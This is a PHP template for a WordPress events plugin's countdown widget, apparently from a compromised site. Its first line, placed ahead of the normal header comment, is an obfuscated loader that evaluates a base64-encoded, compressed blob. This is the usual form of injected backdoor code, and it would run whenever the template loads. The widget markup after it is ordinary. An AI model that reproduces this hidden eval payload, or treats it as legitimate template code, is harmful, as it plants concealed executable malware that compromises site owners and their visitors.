<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Events Pro Countdown Widget
 * This is the template for the output of the event countdown widget.
 * All the items are turned on and off through the widget admin.
 * There is currently no default styling, which is highly needed.
 *
 * Override this template in your own theme by creating a file at [your-theme]/tribe-events/pro/widgets/countdown-widget.php
 *
 * @package TribeEventsCalendarPro
 *
 */

if ( ! defined( 'ABSPATH' ) ) {
	die( '-1' );
} ?>

<div class="tribe-countdown-timer tribe-clearfix">
	<div class="tribe-countdown-days tribe-countdown-number">
		<span class="fusion-tribe-counterdown-over">DD</span>
		<span class="tribe-countdown-under"><?php esc_html_e( 'days', 'tribe-events-calendar-pro' ); ?></span>
	</div>
	<div class="tribe-countdown-hours tribe-countdown-number">
		<span class="fusion-tribe-counterdown-over">HH</span>
		<span class="tribe-countdown-under"><?php esc_html_e( 'hours', 'tribe-events-calendar-pro' ); ?></span>
	</div>
	<div class="tribe-countdown-minutes tribe-countdown-number">
		<span class="fusion-tribe-counterdown-over">MM</span>
		<span class="tribe-countdown-under"><?php esc_html_e( 'min', 'tribe-events-calendar-pro' ); ?></span>
	</div>
	<?php if ( $show_seconds ) : ?>
		<div class="tribe-countdown-seconds tribe-countdown-number tribe-countdown-right">
			<span class="fusion-tribe-counterdown-over">SS</span>
			<span class="tribe-countdown-under"><?php esc_html_e( 'sec', 'tribe-events-calendar-pro' ); ?></span>
		</div>
	<?php endif; ?>
</div>
